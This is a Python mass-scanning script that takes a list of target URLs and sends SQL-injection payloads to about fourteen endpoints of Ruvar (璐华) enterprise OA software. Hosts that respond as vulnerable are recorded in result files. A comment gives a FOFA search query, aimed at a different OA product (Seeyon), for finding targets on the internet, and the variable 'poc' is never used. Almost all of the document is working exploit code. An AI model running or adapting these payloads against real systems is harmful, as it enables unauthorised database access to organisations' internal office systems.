
import json
import requests

#fofa：app="Yonyou-Seeyon-OA" && body="致远协创A6" && host!="gov.cn"

urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "ChAr(71)%2BChAr(81)%2BChAr(88)%2B@@VeRsIoN"
    urls = ["/flow/flow_get_if_value.aspx?template_id=",
            "/include/get_dict.aspx?bt_id=",
            "/LHMail/email_attach_delete.aspx?attach_id=",
            "/OnlineChat/chat_show.aspx?id=",
            "/OnlineChat/chatroom_show.aspx?id=",
            "/OnlineReport/get_condiction.aspx?t_id="]
    try:
        noexist = True
        for turl in urls:
            vulnurl = url + turl + payload
            req = requests.get(vulnurl,  timeout=10, verify=False)
            if req.status_code == 500 and r"GQXMicrosoft" in req.text:
                print("[+]存在璐华企业版OA系统多处SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('SQL注入漏洞.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
                noexist = False

        req = requests.get(url + "/include/get_user.aspx", timeout=10, verify=False)
        if r"button_normal" in req.text:
            print("[+]存在璐华企业版OA系统POST SQL注入漏洞...(高危)\tpayload: " + url + "/include/get_user.aspx", "red")
            with open('SQL注入漏洞2.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
            noexist = False
        if noexist:
            print("[-]不存在ruvar_oa_multi_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payloads = ["/PersonalAffair/worklog_template_show.aspx?id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/ProjectManage/pm_gatt_inc.aspx?project_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkPlan/plan_template_preview.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27AnD%20%28Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))%29%3E0%29--"]
    try:
        noexist = True
        for payload in payloads:
            vulnurl = url + payload
            req = requests.get(vulnurl,  timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                print("[+]存在璐华企业版OA系统多处SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('SQL注入漏洞3.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
                noexist = False
        if noexist:
            print("[-]不存在ruvar_oa_multi_sqli2漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payloads = [
        "/WorkFlow/OfficeFileDownload.aspx?filename=1%27AnD%20%28Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))%29%3E0--",
        "/WorkFlow/wf_work_stat_setting.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
        "/WorkFlow/wf_work_form_save.aspx?office_missive_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
        "/WorkFlow/wf_get_fields_approve.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))"]
    try:
        noexist = True
        for payload in payloads:
            vulnurl = url + payload
            req = requests.get(vulnurl,  timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                print("[+]存在璐华企业版OA系统多处SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('漏洞.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
                noexist = False
        if noexist:
            print("[-]不存在ruvar_oa_multi_sqli3漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")